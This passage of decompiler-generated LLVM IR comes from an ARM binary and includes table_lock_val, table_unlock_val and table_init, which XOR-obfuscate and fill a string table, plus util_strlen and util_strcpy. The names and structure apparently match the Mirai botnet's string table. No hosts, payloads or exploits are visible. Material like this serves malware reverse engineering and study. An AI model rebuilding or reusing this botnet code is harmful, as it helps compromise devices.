  %v4_f35c = load i32, i32* %v3_f35c, align 4
  store i32 %v5_f358, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_f35c6 = phi i32 [ %v4_f35c5, %.thread ], [ %v4_f35c, %bb ]
  ret i32 %v4_f35c6

; uselistorder directives
  uselistorder i32 %v2_f350, { 1, 0, 2 }
  uselistorder i32 %v3_f34c, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f374 = mul i32 %arg1, 8
  %v2_f378 = add i32 %v3_f374, ptrtoint (i32* @global_var_23a70.509 to i32)
  %v2_f37c = load i32, i32* @global_var_20dcc.512, align 4
  store i32 %v2_f37c, i32* @r1, align 4
  %v1_f380 = add i32 %v3_f374, add (i32 ptrtoint (i32* @global_var_23a70.509 to i32), i32 4)
  %v2_f380 = inttoptr i32 %v1_f380 to i16*
  %v3_f380 = load i16, i16* %v2_f380, align 4
  %v3_f384 = udiv i32 %v2_f37c, 256
  %v2_f388 = icmp eq i16 %v3_f380, 0
  store i1 %v2_f388, i1* @cpsr_z, align 1
  %v3_f38c = udiv i32 %v2_f37c, 65536
  store i32 %v3_f38c, i32* @r3, align 4
  %v3_f390 = load i32, i32* @r4, align 4
  store i32 %v3_f390, i32* %stack_var_-16, align 4
  %v1_f394 = urem i32 %v3_f384, 256
  store i32 %v1_f394, i32* %r6.global-to-local, align 4
  %v1_f398 = urem i32 %v3_f38c, 256
  store i32 %v1_f398, i32* %r5.global-to-local, align 4
  %v3_f39c = udiv i32 %v2_f37c, 16777216
  store i32 %v3_f39c, i32* %r4.global-to-local, align 4
  %v1_f3a0 = urem i32 %v2_f37c, 256
  store i32 %v1_f3a0, i32* %lr.global-to-local, align 4
  br i1 %v2_f388, label %dec_label_pc_f3fc, label %dec_label_pc_f3a8

dec_label_pc_f3a8:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_f3ac = inttoptr i32 %v2_f378 to i32*
  br label %dec_label_pc_f3ac

dec_label_pc_f3ac:                                ; preds = %dec_label_pc_f3ac.dec_label_pc_f3ac_crit_edge, %dec_label_pc_f3a8
  %v0_f3b4 = phi i32 [ %v0_f3b4.pre, %dec_label_pc_f3ac.dec_label_pc_f3ac_crit_edge ], [ %v1_f3a0, %dec_label_pc_f3a8 ]
  %v2_f3b8 = phi i32 [ %v1_f3f0, %dec_label_pc_f3ac.dec_label_pc_f3ac_crit_edge ], [ 0, %dec_label_pc_f3a8 ]
  %v2_f3ac = load i32, i32* %v1_f3ac, align 4
  %v2_f3b0 = add i32 %v2_f3ac, %v2_f3b8
  %v3_f3b0 = inttoptr i32 %v2_f3b0 to i8*
  %v4_f3b0 = load i8, i8* %v3_f3b0, align 1
  %v6_f3b0 = zext i8 %v4_f3b0 to i32
  %v2_f3b4 = xor i32 %v6_f3b0, %v0_f3b4
  %v1_f3b8 = trunc i32 %v2_f3b4 to i8
  store i8 %v1_f3b8, i8* %v3_f3b0, align 1
  %v2_f3bc = load i32, i32* %v1_f3ac, align 4
  %v0_f3c0 = load i32, i32* @ip, align 4
  %v2_f3c0 = add i32 %v0_f3c0, %v2_f3bc
  %v3_f3c0 = inttoptr i32 %v2_f3c0 to i8*
  %v4_f3c0 = load i8, i8* %v3_f3c0, align 1
  %v6_f3c0 = zext i8 %v4_f3c0 to i32
  %v0_f3c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_f3c4 = xor i32 %v0_f3c4, %v6_f3c0
  %v1_f3c8 = trunc i32 %v2_f3c4 to i8
  store i8 %v1_f3c8, i8* %v3_f3c0, align 1
  %v2_f3cc = load i32, i32* %v1_f3ac, align 4
  %v0_f3d0 = load i32, i32* @ip, align 4
  %v2_f3d0 = add i32 %v0_f3d0, %v2_f3cc
  %v3_f3d0 = inttoptr i32 %v2_f3d0 to i8*
  %v4_f3d0 = load i8, i8* %v3_f3d0, align 1
  %v6_f3d0 = zext i8 %v4_f3d0 to i32
  %v0_f3d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_f3d4 = xor i32 %v0_f3d4, %v6_f3d0
  %v1_f3d8 = trunc i32 %v2_f3d4 to i8
  store i8 %v1_f3d8, i8* %v3_f3d0, align 1
  %v2_f3dc = load i32, i32* %v1_f3ac, align 4
  store i32 %v2_f3dc, i32* @r1, align 4
  %v0_f3e0 = load i32, i32* @ip, align 4
  %v2_f3e0 = add i32 %v0_f3e0, %v2_f3dc
  %v3_f3e0 = inttoptr i32 %v2_f3e0 to i8*
  %v4_f3e0 = load i8, i8* %v3_f3e0, align 1
  %v6_f3e0 = zext i8 %v4_f3e0 to i32
  %v0_f3e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_f3e4 = xor i32 %v0_f3e4, %v6_f3e0
  store i32 %v2_f3e4, i32* @r3, align 4
  %v1_f3e8 = trunc i32 %v2_f3e4 to i8
  store i8 %v1_f3e8, i8* %v3_f3e0, align 1
  %v3_f3ec = load i16, i16* %v2_f380, align 4
  %v4_f3ec = zext i16 %v3_f3ec to i32
  %v0_f3f0 = load i32, i32* @ip, align 4
  %v1_f3f0 = add i32 %v0_f3f0, 1
  store i32 %v1_f3f0, i32* @ip, align 4
  %v9_f3f4 = icmp eq i32 %v4_f3ec, %v1_f3f0
  store i1 %v9_f3f4, i1* @cpsr_z, align 1
  %v8_f3f8 = icmp sgt i32 %v4_f3ec, %v1_f3f0
  br i1 %v8_f3f8, label %dec_label_pc_f3ac.dec_label_pc_f3ac_crit_edge, label %dec_label_pc_f3fc.loopexit

dec_label_pc_f3ac.dec_label_pc_f3ac_crit_edge:    ; preds = %dec_label_pc_f3ac
  %v0_f3b4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f3ac

dec_label_pc_f3fc.loopexit:                       ; preds = %dec_label_pc_f3ac
  %v2_f3fc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_f3fc

dec_label_pc_f3fc:                                ; preds = %dec_label_pc_f3fc.loopexit, %entry
  %v2_f3fc = phi i32 [ %v2_f3fc.pre, %dec_label_pc_f3fc.loopexit ], [ %v3_f390, %entry ]
  store i32 %v2_f3fc, i32* @r4, align 4
  ret i32 %v2_f378

; uselistorder directives
  uselistorder i32 %v1_f3f0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f3a0, { 1, 0 }
  uselistorder i32 %v3_f38c, { 1, 0 }
  uselistorder i32 %v2_f37c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v2_f378, { 1, 0 }
  uselistorder i32 %v3_f374, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f414 = mul i32 %arg1, 8
  %v2_f418 = add i32 %v3_f414, ptrtoint (i32* @global_var_23a70.509 to i32)
  %v2_f41c = load i32, i32* @global_var_20dcc.512, align 4
  %v1_f420 = add i32 %v3_f414, add (i32 ptrtoint (i32* @global_var_23a70.509 to i32), i32 4)
  %v2_f420 = inttoptr i32 %v1_f420 to i16*
  %v3_f420 = load i16, i16* %v2_f420, align 4
  %v3_f424 = udiv i32 %v2_f41c, 256
  %v2_f428 = icmp eq i16 %v3_f420, 0
  %v3_f42c = udiv i32 %v2_f41c, 65536
  %v3_f430 = load i32, i32* @r4, align 4
  store i32 %v3_f430, i32* %stack_var_-16, align 4
  %v1_f434 = urem i32 %v3_f424, 256
  store i32 %v1_f434, i32* %r6.global-to-local, align 4
  %v1_f438 = urem i32 %v3_f42c, 256
  store i32 %v1_f438, i32* %r5.global-to-local, align 4
  %v3_f43c = udiv i32 %v2_f41c, 16777216
  store i32 %v3_f43c, i32* %r4.global-to-local, align 4
  %v1_f440 = urem i32 %v2_f41c, 256
  store i32 %v1_f440, i32* %lr.global-to-local, align 4
  br i1 %v2_f428, label %dec_label_pc_f49c, label %dec_label_pc_f448

dec_label_pc_f448:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_f44c = inttoptr i32 %v2_f418 to i32*
  br label %dec_label_pc_f44c

dec_label_pc_f44c:                                ; preds = %dec_label_pc_f44c.dec_label_pc_f44c_crit_edge, %dec_label_pc_f448
  %v0_f454 = phi i32 [ %v0_f454.pre, %dec_label_pc_f44c.dec_label_pc_f44c_crit_edge ], [ %v1_f440, %dec_label_pc_f448 ]
  %v2_f458 = phi i32 [ %v1_f490, %dec_label_pc_f44c.dec_label_pc_f44c_crit_edge ], [ 0, %dec_label_pc_f448 ]
  %v2_f44c = load i32, i32* %v1_f44c, align 4
  %v2_f450 = add i32 %v2_f44c, %v2_f458
  %v3_f450 = inttoptr i32 %v2_f450 to i8*
  %v4_f450 = load i8, i8* %v3_f450, align 1
  %v6_f450 = zext i8 %v4_f450 to i32
  %v2_f454 = xor i32 %v6_f450, %v0_f454
  %v1_f458 = trunc i32 %v2_f454 to i8
  store i8 %v1_f458, i8* %v3_f450, align 1
  %v2_f45c = load i32, i32* %v1_f44c, align 4
  %v0_f460 = load i32, i32* @ip, align 4
  %v2_f460 = add i32 %v0_f460, %v2_f45c
  %v3_f460 = inttoptr i32 %v2_f460 to i8*
  %v4_f460 = load i8, i8* %v3_f460, align 1
  %v6_f460 = zext i8 %v4_f460 to i32
  %v0_f464 = load i32, i32* %r6.global-to-local, align 4
  %v2_f464 = xor i32 %v0_f464, %v6_f460
  %v1_f468 = trunc i32 %v2_f464 to i8
  store i8 %v1_f468, i8* %v3_f460, align 1
  %v2_f46c = load i32, i32* %v1_f44c, align 4
  %v0_f470 = load i32, i32* @ip, align 4
  %v2_f470 = add i32 %v0_f470, %v2_f46c
  %v3_f470 = inttoptr i32 %v2_f470 to i8*
  %v4_f470 = load i8, i8* %v3_f470, align 1
  %v6_f470 = zext i8 %v4_f470 to i32
  %v0_f474 = load i32, i32* %r5.global-to-local, align 4
  %v2_f474 = xor i32 %v0_f474, %v6_f470
  %v1_f478 = trunc i32 %v2_f474 to i8
  store i8 %v1_f478, i8* %v3_f470, align 1
  %v2_f47c = load i32, i32* %v1_f44c, align 4
  %v0_f480 = load i32, i32* @ip, align 4
  %v2_f480 = add i32 %v0_f480, %v2_f47c
  %v3_f480 = inttoptr i32 %v2_f480 to i8*
  %v4_f480 = load i8, i8* %v3_f480, align 1
  %v6_f480 = zext i8 %v4_f480 to i32
  %v0_f484 = load i32, i32* %r4.global-to-local, align 4
  %v2_f484 = xor i32 %v0_f484, %v6_f480
  %v1_f488 = trunc i32 %v2_f484 to i8
  store i8 %v1_f488, i8* %v3_f480, align 1
  %v3_f48c = load i16, i16* %v2_f420, align 4
  %v4_f48c = zext i16 %v3_f48c to i32
  %v0_f490 = load i32, i32* @ip, align 4
  %v1_f490 = add i32 %v0_f490, 1
  store i32 %v1_f490, i32* @ip, align 4
  %v8_f498 = icmp sgt i32 %v4_f48c, %v1_f490
  br i1 %v8_f498, label %dec_label_pc_f44c.dec_label_pc_f44c_crit_edge, label %dec_label_pc_f49c.loopexit

dec_label_pc_f44c.dec_label_pc_f44c_crit_edge:    ; preds = %dec_label_pc_f44c
  %v0_f454.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f44c

dec_label_pc_f49c.loopexit:                       ; preds = %dec_label_pc_f44c
  %v2_f49c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_f49c

dec_label_pc_f49c:                                ; preds = %dec_label_pc_f49c.loopexit, %entry
  %v2_f49c = phi i32 [ %v2_f49c.pre, %dec_label_pc_f49c.loopexit ], [ %v3_f430, %entry ]
  store i32 %v2_f49c, i32* @r4, align 4
  ret i32 %v2_f418

; uselistorder directives
  uselistorder i32 %v1_f490, { 1, 2, 0 }
  uselistorder i32 %v1_f440, { 1, 0 }
  uselistorder i32 %v2_f41c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_f418, { 1, 0 }
  uselistorder i32 %v3_f414, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_f4ac = load i32, i32* @r4, align 4
  store i32 %v3_f4ac, i32* %stack_var_-24, align 4
  %v6_f4ac = load i32, i32* @r5, align 4
  %v9_f4ac = load i32, i32* @r6, align 4
  %v12_f4ac = load i32, i32* @r7, align 4
  %v15_f4ac = load i32, i32* @r8, align 4
  store i32 2, i32* @r0, align 4
  %v0_f4b4 = call i32 @malloc()
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_23a70.509 to i32), i32* @r4, align 4
  store i32 %v0_f4b4, i32* @r6, align 4
  %v3_f4cc = call i32 @util_memcpy(i32 %v0_f4b4, i32 ptrtoint (i32* @global_var_186fc.517 to i32), i32 2)
  %v0_f4d0 = load i32, i32* @r5, align 4
  store i32 %v0_f4d0, i32* @r0, align 4
  %v0_f4d4 = load i32, i32* @r6, align 4
  store i32 %v0_f4d4, i32* @global_var_23a78.518, align 4
  %v1_f4d8 = trunc i32 %v0_f4d0 to i16
  store i16 %v1_f4d8, i16* bitcast (i32* @global_var_23a7c.519 to i16*), align 4
  %v0_f4dc = call i32 @malloc()
  %v0_f4e0 = load i32, i32* @r5, align 4
  store i32 %v0_f4dc, i32* @r6, align 4
  %v3_f4ec = call i32 @util_memcpy(i32 %v0_f4dc, i32 ptrtoint (i32* @global_var_18700.521 to i32), i32 %v0_f4e0)
  store i32 19, i32* @r0, align 4
  %v0_f4f4 = load i32, i32* @r6, align 4
  store i32 %v0_f4f4, i32* @global_var_23a80.522, align 4
  %v0_f4f8 = load i32, i32* @r5, align 4
  %v1_f4f8 = trunc i32 %v0_f4f8 to i16
  store i16 %v1_f4f8, i16* bitcast (i32* @global_var_23a84.523 to i16*), align 4
  %v0_f4fc = call i32 @malloc()
  store i32 %v0_f4fc, i32* @r5, align 4
  store i32 19, i32* @r8, align 4
  %v4_f510 = call i32 @util_memcpy(i32 %v0_f4fc, i32 ptrtoint ([20 x i8]* @global_var_18704.525 to i32), i32 19)
  store i32 6, i32* @r0, align 4
  %v0_f518 = load i32, i32* @r5, align 4
  store i32 %v0_f518, i32* @global_var_23a88.526, align 4
  %v0_f51c = load i32, i32* @r8, align 4
  %v1_f51c = trunc i32 %v0_f51c to i16
  store i16 %v1_f51c, i16* bitcast (i32* @global_var_23a8c.527 to i16*), align 4
  %v0_f520 = call i32 @malloc()
  store i32 6, i32* @r7, align 4
  store i32 %v0_f520, i32* %r5.global-to-local, align 4
  %v4_f534 = call i32 @util_memcpy(i32 %v0_f520, i32 ptrtoint ([7 x i8]* @global_var_18718.529 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 %v0_f520, i32* @global_var_23b20.530, align 4
  %v0_f540 = load i32, i32* @r7, align 4
  %v1_f540 = trunc i32 %v0_f540 to i16
  store i16 %v1_f540, i16* bitcast (i32* @global_var_23b24.531 to i16*), align 4
  store i32 7, i32* @r5, align 4
  %v0_f548 = call i32 @malloc()
  %v0_f54c = load i32, i32* @r5, align 4
  store i32 %v0_f548, i32* @r6, align 4
  %v4_f558 = call i32 @util_memcpy(i32 %v0_f548, i32 ptrtoint ([8 x i8]* @global_var_18720.533 to i32), i32 %v0_f54c)
  %v0_f55c = load i32, i32* @r5, align 4
  store i32 %v0_f55c, i32* @r0, align 4
  %v0_f560 = load i32, i32* @r6, align 4
  store i32 %v0_f560, i32* @global_var_23b28.534, align 4
  %v1_f564 = trunc i32 %v0_f55c to i16
  store i16 %v1_f564, i16* bitcast (i32* @global_var_23b2c.535 to i16*), align 4
  %v0_f568 = call i32 @malloc()
  %v0_f56c = load i32, i32* @r5, align 4
  store i32 %v0_f568, i32* @r6, align 4
  %v4_f578 = call i32 @util_memcpy(i32 %v0_f568, i32 ptrtoint ([8 x i8]* @global_var_18728.537 to i32), i32 %v0_f56c)
  store i32 3, i32* @r0, align 4
  %v0_f580 = load i32, i32* @r6, align 4
  store i32 %v0_f580, i32* @global_var_23b30.538, align 4
  %v0_f584 = load i32, i32* @r5, align 4
  %v1_f584 = trunc i32 %v0_f584 to i16
  store i16 %v1_f584, i16* bitcast (i32* @global_var_23b34.539 to i16*), align 4
  %v0_f588 = call i32 @malloc()
  store i32 %v0_f588, i32* @r5, align 4
  %v4_f598 = call i32 @util_memcpy(i32 %v0_f588, i32 ptrtoint ([4 x i8]* @global_var_18730.541 to i32), i32 3)
  store i32 24, i32* @r0, align 4
  %v0_f5a4 = load i32, i32* @r5, align 4
  store i32 %v0_f5a4, i32* @global_var_23b38.542, align 4
  store i16 3, i16* bitcast (i32* @global_var_23b3c.543 to i16*), align 4
  %v0_f5ac = call i32 @malloc()
  store i32 %v0_f5ac, i32* @r5, align 4
  %v3_f5bc = call i32 @util_memcpy(i32 %v0_f5ac, i32 ptrtoint (i32* @global_var_18734.545 to i32), i32 24)
  store i32 29, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_23b44.546 to i16*), align 4
  %v0_f5cc = load i32, i32* @r5, align 4
  store i32 %v0_f5cc, i32* @global_var_23b40.547, align 4
  %v0_f5d0 = call i32 @malloc()
  store i32 %v0_f5d0, i32* @r5, align 4
  %v3_f5e0 = call i32 @util_memcpy(i32 %v0_f5d0, i32 ptrtoint (i32* @global_var_18750.549 to i32), i32 29)
  store i32 9, i32* @r0, align 4
  %v0_f5ec = load i32, i32* @r5, align 4
  store i32 %v0_f5ec, i32* @global_var_23b48.550, align 4
  store i16 29, i16* bitcast (i32* @global_var_23b4c.551 to i16*), align 4
  %v0_f5f4 = call i32 @malloc()
  store i32 %v0_f5f4, i32* @r5, align 4
  %v4_f604 = call i32 @util_memcpy(i32 %v0_f5f4, i32 ptrtoint ([10 x i8]* @global_var_18770.553 to i32), i32 9)
  store i32 8, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_23b54.554 to i16*), align 4
  %v0_f614 = load i32, i32* @r5, align 4
  store i32 %v0_f614, i32* @global_var_23b50.555, align 4
  %v0_f618 = call i32 @malloc()
  store i32 %v0_f618, i32* @r5, align 4
  %v4_f628 = call i32 @util_memcpy(i32 %v0_f618, i32 ptrtoint ([9 x i8]* @global_var_1877c.557 to i32), i32 8)
  store i32 5, i32* @r0, align 4
  %v0_f634 = load i32, i32* @r5, align 4
  store i32 %v0_f634, i32* @global_var_23b58.558, align 4
  store i16 8, i16* bitcast (i32* @global_var_23b5c.559 to i16*), align 4
  %v0_f63c = call i32 @malloc()
  store i32 %v0_f63c, i32* @r5, align 4
  %v4_f64c = call i32 @util_memcpy(i32 %v0_f63c, i32 ptrtoint ([6 x i8]* @global_var_18788.561 to i32), i32 5)
  %v0_f654 = load i32, i32* @r7, align 4
  store i32 %v0_f654, i32* @r0, align 4
  store i16 5, i16* bitcast (i32* @global_var_23b64.562 to i16*), align 4
  %v0_f65c = load i32, i32* @r5, align 4
  store i32 %v0_f65c, i32* @global_var_23b60.563, align 4
  %v0_f660 = call i32 @malloc()
  %v0_f664 = load i32, i32* @r7, align 4
  store i32 %v0_f660, i32* @r5, align 4
  %v4_f670 = call i32 @util_memcpy(i32 %v0_f660, i32 ptrtoint ([7 x i8]* @global_var_18790.565 to i32), i32 %v0_f664)
  store i32 21, i32* @r0, align 4
  %v0_f678 = load i32, i32* @r5, align 4
  store i32 %v0_f678, i32* @global_var_23b68.566, align 4
  %v0_f67c = load i32, i32* @r7, align 4
  %v1_f67c = trunc i32 %v0_f67c to i16
  store i16 %v1_f67c, i16* bitcast (i32* @global_var_23b6c.567 to i16*), align 4
  %v0_f680 = call i32 @malloc()
  store i32 %v0_f680, i32* @r5, align 4
  store i32 21, i32* @r6, align 4
  %v3_f694 = call i32 @util_memcpy(i32 %v0_f680, i32 ptrtoint (i32* @global_var_18798.569 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  %v0_f6a0 = load i32, i32* @r6, align 4
  %v1_f6a0 = trunc i32 %v0_f6a0 to i16
  %v2_f6a0 = load i32, i32* @r4, align 4
  %v4_f6a0 = add i32 %v2_f6a0, 260
  %v5_f6a0 = inttoptr i32 %v4_f6a0 to i16*
  store i16 %v1_f6a0, i16* %v5_f6a0, align 2
  %v0_f6a4 = load i32, i32* @r5, align 4
  store i32 %v0_f6a4, i32* @global_var_23b70.570, align 4
  %v0_f6a8 = call i32 @malloc()
  store i32 %v0_f6a8, i32* @r5, align 4
  %v3_f6b8 = call i32 @util_memcpy(i32 %v0_f6a8, i32 ptrtoint (i32* @global_var_187b0.572 to i32), i32 17)
  store i32 11, i32* @r0, align 4
  %v2_f6c8 = load i32, i32* @r4, align 4
  %v4_f6c8 = add i32 %v2_f6c8, 268
  %v5_f6c8 = inttoptr i32 %v4_f6c8 to i16*
  store i16 17, i16* %v5_f6c8, align 2
  %v0_f6cc = load i32, i32* @r5, align 4
  store i32 %v0_f6cc, i32* @global_var_23b78.573, align 4
  %v0_f6d0 = call i32 @malloc()
  store i32 %v0_f6d0, i32* @r5, align 4
  %v0_f6e0 = load i32, i32* @r7, align 4
  %v1_f6e0 = add i32 %v0_f6e0, 5
  store i32 %v1_f6e0, i32* @r7, align 4
  %v4_f6e4 = call i32 @util_memcpy(i32 %v0_f6d0, i32 ptrtoint ([12 x i8]* @global_var_187c4.575 to i32), i32 11)
  %v0_f6ec = load i32, i32* @r6, align 4
  store i32 %v0_f6ec, i32* @r0, align 4
  %v0_f6f0 = load i32, i32* @r7, align 4
  %v1_f6f0 = trunc i32 %v0_f6f0 to i16
  %v2_f6f0 = load i32, i32* @r4, align 4
  %v4_f6f0 = add i32 %v2_f6f0, 276
  %v5_f6f0 = inttoptr i32 %v4_f6f0 to i16*
  store i16 %v1_f6f0, i16* %v5_f6f0, align 2
  %v0_f6f4 = load i32, i32* @r5, align 4
  store i32 %v0_f6f4, i32* @global_var_23b80.576, align 4
  %v0_f6f8 = call i32 @malloc()
  %v0_f700 = load i32, i32* @r6, align 4
  store i32 %v0_f6f8, i32* @r5, align 4
  %v3_f708 = call i32 @util_memcpy(i32 %v0_f6f8, i32 ptrtoint (i32* @global_var_187d0.578 to i32), i32 %v0_f700)
  %v0_f710 = load i32, i32* @r8, align 4
  store i32 %v0_f710, i32* @r0, align 4
  %v0_f714 = load i32, i32* @r6, align 4
  %v1_f714 = trunc i32 %v0_f714 to i16
  %v2_f714 = load i32, i32* @r4, align 4
  %v4_f714 = add i32 %v2_f714, 284
  %v5_f714 = inttoptr i32 %v4_f714 to i16*
  store i16 %v1_f714, i16* %v5_f714, align 2
  %v0_f718 = load i32, i32* @r5, align 4
  store i32 %v0_f718, i32* @global_var_23b88.579, align 4
  %v0_f71c = call i32 @malloc()
  %v0_f724 = load i32, i32* @r8, align 4
  store i32 %v0_f71c, i32* @r5, align 4
  %v3_f72c = call i32 @util_memcpy(i32 %v0_f71c, i32 ptrtoint (i32* @global_var_187e8.581 to i32), i32 %v0_f724)
  store i32 23, i32* @r0, align 4
  %v0_f738 = load i32, i32* @r8, align 4
  %v1_f738 = trunc i32 %v0_f738 to i16
  %v2_f738 = load i32, i32* @r4, align 4
  %v4_f738 = add i32 %v2_f738, 292
  %v5_f738 = inttoptr i32 %v4_f738 to i16*
  store i16 %v1_f738, i16* %v5_f738, align 2
  %v0_f73c = load i32, i32* @r5, align 4
  store i32 %v0_f73c, i32* @global_var_23b90.582, align 4
  %v0_f740 = call i32 @malloc()
  store i32 %v0_f740, i32* @r5, align 4
  %v3_f750 = call i32 @util_memcpy(i32 %v0_f740, i32 ptrtoint (i32* @global_var_187fc.584 to i32), i32 23)
  %v0_f75c = load i32, i32* @r7, align 4
  store i32 %v0_f75c, i32* @r0, align 4
  %v2_f760 = load i32, i32* @r4, align 4
  %v4_f760 = add i32 %v2_f760, 300
  %v5_f760 = inttoptr i32 %v4_f760 to i16*
  store i16 23, i16* %v5_f760, align 2
  %v0_f764 = load i32, i32* @r5, align 4
  store i32 %v0_f764, i32* @global_var_23b98.585, align 4
  %v0_f768 = call i32 @malloc()
  %v0_f770 = load i32, i32* @r7, align 4
  store i32 %v0_f768, i32* %r5.global-to-local, align 4
  %v4_f778 = call i32 @util_memcpy(i32 %v0_f768, i32 ptrtoint ([12 x i8]* @global_var_18814.587 to i32), i32 %v0_f770)
  %v0_f780 = load i32, i32* @r7, align 4
  %v1_f780 = trunc i32 %v0_f780 to i16
  %v2_f780 = load i32, i32* @r4, align 4
  %v4_f780 = add i32 %v2_f780, 308
  %v5_f780 = inttoptr i32 %v4_f780 to i16*
  store i16 %v1_f780, i16* %v5_f780, align 2
  %v0_f784 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_f784, i32* @global_var_23ba0.588, align 4
  %v2_f788 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_f788, i32* @r4, align 4
  store i32 %v6_f4ac, i32* @r5, align 4
  store i32 %v9_f4ac, i32* @r6, align 4
  store i32 %v12_f4ac, i32* @r7, align 4
  store i32 %v15_f4ac, i32* @r8, align 4
  ret i32 %v4_f778

; uselistorder directives
  uselistorder i32 %v0_f768, { 1, 0 }
  uselistorder i32 %v0_f71c, { 1, 0 }
  uselistorder i32 %v0_f6f8, { 1, 0 }
  uselistorder i32 %v0_f660, { 1, 0 }
  uselistorder i32 %v0_f568, { 1, 0 }
  uselistorder i32 %v0_f548, { 1, 0 }
  uselistorder i32 %v0_f520, { 0, 2, 1 }
  uselistorder i32 %v0_f4dc, { 1, 0 }
  uselistorder i32 %v0_f4b4, { 1, 0 }
  uselistorder i32 23, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 284, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32 29, { 0, 8, 1, 5, 2, 6, 3, 7, 9, 4 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_23a70.509 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_f7e8 = load i8, i8* %arg1, align 1
  %v2_f7ec = icmp eq i8 %v3_f7e8, 0
  %v0_f7f0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_f7ec, i32 %v0_f7f0)
  br label %dec_label_pc_f7f8

dec_label_pc_f7f8:                                ; preds = %dec_label_pc_f7f8, %entry
  %v0_f7f8 = phi i32 [ %v1_f7f8, %dec_label_pc_f7f8 ], [ 0, %entry ]
  %v1_f7f8 = add i32 %v0_f7f8, 1
  %v2_f7fc = add i32 %v1_f7f8, %tmp
  %v3_f7fc = inttoptr i32 %v2_f7fc to i8*
  %v4_f7fc = load i8, i8* %v3_f7fc, align 1
  %v2_f800 = icmp eq i8 %v4_f7fc, 0
  br i1 %v2_f800, label %dec_label_pc_f808, label %dec_label_pc_f7f8

dec_label_pc_f808:                                ; preds = %dec_label_pc_f7f8
  ret i32 %v1_f7f8
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_f80c = load i8, i8* %arg1, align 1
  %v3_f80c = zext i8 %v2_f80c to i32
  %v2_f810 = icmp eq i8 %v2_f80c, 0
  br i1 %v2_f810, label %bb, label %dec_label_pc_f81c

bb:                                               ; preds = %entry
  store i32 %v3_f80c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f830

dec_label_pc_f81c:                                ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f820

dec_label_pc_f820:                                ; preds = %dec_label_pc_f820, %dec_label_pc_f81c
  %v0_f820 = phi i32 [ %v1_f820, %dec_label_pc_f820 ], [ 0, %dec_label_pc_f81c ]
  %v1_f820 = add i32 %v0_f820, 1
  store i32 %v1_f820, i32* %ip.global-to-local, align 4
  %v2_f824 = add i32 %v1_f820, %tmp
  %v3_f824 = inttoptr i32 %v2_f824 to i8*
  %v4_f824 = load i8, i8* %v3_f824, align 1
  %v6_f824 = zext i8 %v4_f824 to i32
  store i32 %v6_f824, i32* %r3.global-to-local, align 4
  %v2_f828 = icmp eq i8 %v4_f824, 0
  br i1 %v2_f828, label %dec_label_pc_f830, label %dec_label_pc_f820

dec_label_pc_f830:                                ; preds = %dec_label_pc_f820, %bb
  %v0_f830 = phi i32 [ %v3_f80c, %bb ], [ %v1_f820, %dec_label_pc_f820 ]
  store i32 %v0_f830, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f83c

dec_label_pc_f838:                                ; preds = %dec_label_pc_f83c
  %v0_f838 = load i32, i32* %r1.global-to-local, align 4
  %v1_f838 = add i32 %v0_f838, 1
  %v2_f838 = inttoptr i32 %v1_f838 to i8*
  %v3_f838 = load i8, i8* %v2_f838, align 1
  store i32 %v1_f838, i32* %r1.global-to-local, align 4
  %v0_f83c.pr = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f83c

dec_label_pc_f83c:                                ; preds = %dec_label_pc_f830, %dec_label_pc_f838
